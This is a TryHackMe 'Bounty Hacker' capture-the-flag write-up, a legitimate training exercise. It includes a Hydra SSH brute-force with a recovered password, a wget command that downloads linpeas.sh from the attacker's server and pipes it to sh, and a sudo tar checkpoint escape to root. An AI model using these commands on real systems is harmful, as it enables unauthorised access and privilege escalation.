## TryHackMe - Bounty Hacker
> Completed 10th January  2023.

A Cowboy Bebop themed CTF

> Edit: N/A

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- CrossFTP
- FileZilla
- Hydra
- Linpeas.sh ([source](https://github.com/carlospolop/PEASS-ng))

---
### Methodology
#### Objectives/Flags
1. Who wrote the task list? 
2. What service can you bruteforce with the text file found?
3. What is the user's password? 
4. User.txt
5. Root.txt
---
#### Reconnaissance
To start this box off, I ran a standard nmap scan against the target IP.
```bash
└─$ nmap -T4 -sV -p- 10.10.122.0
  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

From here I attempted to peek into the FTP only to be met with the realisation that I have little experience working that protocol.
```bash
ftp <TargetIP>
  530 this FTP server is anonymous only
```
After realising that I need to use `anonymous` as the username, I spend a while trying to figure out how to get a directory to print out.

After a bunch of cheat sheets and headache, I opted to try and find an application to install that could make this a very easy process. I started by installing `CrossFTP` because of it's simple GUI elements.
```bash
sudo chmod +x ./crossftp_deb_package.deb
sudo dpkg -i ./crossftp_deb_package.deb
crossftp
```
I connected to the target IP which revealed two text files located in the directory. The first being `locks.txt` and the second, `task.txt`. Things started getting progressively annoying here as the application wouldn't download the files from the FTP service because of what I assume was connection dropouts? It annoyed me enough to resort to try another application which was `Filezilla`.
```bash
sudo apt install filezilla
filezilla
```
The application was a bit more cluttered in its GUI but had the same functionality. Unfortunately, I ran into the same issue where the files were refusing the download and the server connection was dropping out. After several minutes of waiting and attempting I got the files moved over onto my local machine. I don't know what really caused or resolved this.

```bash
cat locks.txt
  rEddrAGON
  ReDdr4g0nSynd!cat3
  Dr@gOn$yn9icat3
  R3DDr46ONSYndIC@Te
  ReddRA60N
  R3dDrag0nSynd1c4te
  dRa6oN5YNDiCATE
  ReDDR4g0n5ynDIc4te
  R3Dr4gOn2044
  RedDr4gonSynd1cat3
  R3dDRaG0Nsynd1c@T3
  Synd1c4teDr@g0n
  reddRAg0N
  REddRaG0N5yNdIc47e
  Dra6oN$yndIC@t3
  4L1mi6H71StHeB357
  rEDdragOn$ynd1c473
  DrAgoN5ynD1cATE
  ReDdrag0n$ynd1cate
  Dr@gOn$yND1C4Te
  RedDr@gonSyn9ic47e
  REd$yNdIc47e
  dr@goN5YNd1c@73
  rEDdrAGOnSyNDiCat3
  r3ddr@g0N
  ReDSynd1ca7e
```

```bash
cat task.txt
  1.) Protect Vicious.
  2.) Plan for Red Eye pickup on the moon.
  
  -lin
```

By the contents of `locks.txt` we can infer that this is a wordlist of potential passwords. `task.txt` appears to be some themed objectives however we see can identify names of two characters that could be used with the wordlist. The first being Vicious and the second being Lin who wrote the list.

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
I break out `Hydra` to brute force the SSH service of the target.
```bash
hydra -l lin -P /home/kali/kali-tools/TryHackMe/BountyHacker/locks.txt 10.10.122.0 ssh
  [22][ssh] host: 10.10.122.0   login: lin   password: RedDr4gonSynd1cat3  
```
With the password found we could now punch through and execute code on the target.
```bash
ssh <TargetIP> -l lin
whoami
  lin
id
  uid=1001(lin) gid=1001(lin) groups=1001(lin)
```

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
Right off the bat we can find the `user.txt` in the user `lin`'s home directory
```bash
cat user.txt
  THM{***}
```
From here I could assume that `root.txt`was going to be in the /root/ directory however to be sure of this I spent some time searching through other common directories which included searching for clues to escalate my privilege up.

Directionless I hesitantly brought in the help of `LinPeas`. On my local machine I started up a python3 based HTTP server.
```bash
python3 -m http.server 4443 --directory <sharedfile>
```
On the target machine I requested the Linpeas file.
```bash
wget http://<LocalIP>/linpeas.sh | sh
```
The script got to work, and I analysed the output data. What stuck out most was the following CVE check.
```bash
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034 
```
In the past I had relied too much on Linpeas finding a vulnerability like this instead of practicing my own skills. So instead of going for this exploit I spend more time looking for escalation techniques. Referencing a past box I had completed `Kenobi` I investigated obtaining privileges using a misconfiguration through either PATH variables or binaries. Eventually I found that I could print out a list of the binaries that the user had access to using sudo.
```bash
sudo -l
  [sudo] password for lin: 
  Matching Defaults entries for lin on bountyhacker:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

After discovering `tar` as a possible misconfiguration, I used [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) to look investigate commands/techniques could be used to exploit this.
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Once the command was run the session was instantly escalated to a root user.
```bash
# id
  uid=0(root) gid=0(root) groups=0(root)
```
I could now grab the remaining flag in the directory.
```bash
cat root.txt
  THM{***}
```

---
### After-action
#### What I've learned

It's more rewarding to look for the challenging route. Linpeas won't always be available so the real skill is finding the escapes yourself and once you find it you can refer to that technique later.

#### What I would've done differently

There's not much I would do differently other than not bring in Linpeas to ensure a smaller footprint was used. In a perfect world I'd also take the time to learn and understand the issues I had with accessing FTP using a console.